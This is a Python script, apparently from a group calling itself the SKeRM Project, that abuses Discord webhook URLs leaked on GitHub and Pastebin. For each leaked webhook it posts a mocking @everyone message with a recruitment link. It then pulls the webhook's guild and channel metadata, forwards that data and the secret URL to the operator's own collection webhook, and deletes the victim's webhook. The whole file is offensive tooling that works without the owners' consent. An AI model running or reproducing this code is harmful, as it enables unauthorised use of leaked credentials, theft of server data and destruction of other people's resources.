import json
import time
import requests

from source import parser, webhook, logger

unix_time = str(time.time())
sent_webhooks = []

with open('config.json', 'r') as file:
    config_data = json.load(file)

request_timeout = config_data['request_timeout']
home_webhook = config_data['home_webhook']['url']

def send_message(webhook,data):
    try:
        response = requests.post(webhook, json=data, timeout=5000)
        return int(response.status_code)
    except requests.exceptions.InvalidSchema as e:
        logger.error(f"Bad hook: {e}")

def list_send(webhooks):
    for webhook, webhook_origins in webhooks.items():
        origin = list(webhook_origins.keys())[0]
        split_link = webhook_origins[origin].split('/')

        if origin == "GITHUB":
            status = send_message(webhook, {"content":"@everyone\nfound your webhook lol\nps: if you update it and the repo is still public, **it will** be found again","embeds":[{"color":2565927,"fields":[{"name":":globe_with_meridians: INFO","value":f"Origin: {origin}\nFound at: [github.com/{split_link[3]}/{split_link[4]}](https://github.com/{split_link[3]}/{split_link[4]})"},{"name":":alien: JOIN US","value":"Server: [discord.gg/qEv8Nfg4wK](https://discord.gg/qEv8Nfg4wK)\nContact us: [skerm.wtf](https://skerm.wtf)"}],"author":{"name":"The SKeRM Project"},"footer":{"text":"SKeRM-WH v2.0.1"}}],"username":"SKeRM-BOT","avatar_url":"https://i.pinimg.com/736x/2c/9c/20/2c9c20954029da1dec1020493d9b1347.jpg","attachments":[]})
        elif origin == "PASTEBIN":
            status = send_message(webhook, {"content":"@everyone\nfound your webhook lol\nps: if you update it and the repo is still public, **it will** be found again","embeds":[{"color":2565927,"fields":[{"name":":globe_with_meridians: INFO","value":f"Origin: {origin}\nFound at: {webhook_origins[origin]}"},{"name":":alien: JOIN US","value":"Server: [discord.gg/qEv8Nfg4wK](https://discord.gg/qEv8Nfg4wK)\nContact us: [skerm.wtf](https://skerm.wtf)"}],"author":{"name":"The SKeRM Project"},"footer":{"text":"SKeRM-WH v2.0.1"}}],"username":"SKeRM-BOT","avatar_url":"https://i.pinimg.com/736x/2c/9c/20/2c9c20954029da1dec1020493d9b1347.jpg","attachments":[]})
        if status in [200, 204]:
            logger.info(f"found new hook! {webhook}")
            response = requests.get(webhook)

            if response.status_code == 200:
                
                webhook_data = response.json()
                name = webhook_data['name']
                avatar = webhook_data['avatar']
                guild_id = webhook_data['guild_id']
                channel_id = webhook_data['channel_id']
                webhook_id = webhook_data['id']
                avatar_url = "https://discord.com/assets/1f0bfc0865d324c2587920a7d80c609b.png" if avatar is None else f"https://cdn.discordapp.com/avatars/{webhook_id}/{avatar}.png"

                send_message(home_webhook, {"content": "New Hook Found:", "embeds": [ { "title": name, "color": 5814783, "fields": [ { "name": "Webhook Info", "value": f"Origin: GITHUB\nSource: [https://github.com/{split_link[3]}/...](https://github.com/{split_link[3]}/{split_link[4]})\nURL: [https://discord.com/api/webhooks/...]({webhook})\nFound at: {str(int(time.time()))}\nChannel_id: {str(channel_id)}\nGuild_id: {str(guild_id)}" } ], "thumbnail": { "url": avatar_url } } ], "username": "SKeRM \\ LOGS", "avatar_url": "https://i.pinimg.com/736x/2c/9c/20/2c9c20954029da1dec1020493d9b1347.jpg", "attachments": []})
                requests.delete(webhook)
        else:
            logger.info(f"{status}, bad webhook {webhook}")
            